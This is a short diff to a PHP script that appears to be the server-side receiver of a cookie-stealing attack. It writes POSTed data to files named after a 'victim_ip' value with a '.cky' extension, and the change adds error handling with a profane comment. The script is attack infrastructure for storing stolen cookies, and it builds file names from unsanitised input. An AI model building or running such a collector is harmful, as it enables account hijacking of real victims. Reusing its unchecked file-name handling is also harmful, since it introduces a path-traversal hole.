@@ -17,11 +17,16 @@ if(!empty($_POST)){
     exit();
   }
 
-  $myfile = fopen($_POST['victim_ip'].".cky","w") or die();
-  fwrite($myfile, $message."\n");
-  fclose($myfile);
-    header("HTTP/1.1 200 OK");
+  try {
+    $myfile = fopen($_POST['victim_ip'].".cky","w") or die();
+    fwrite($myfile, $message."\n");
+    fclose($myfile);
+  } catch (Exception $e) {
+    header("HTTP/1.1 418 I'm a teapot"); // get fucked
     exit();
+  }
+  header("HTTP/1.1 200 OK");
+  exit();
 } else {
   header("HTTP/1.1 405 Method Not Allowed");
   exit();
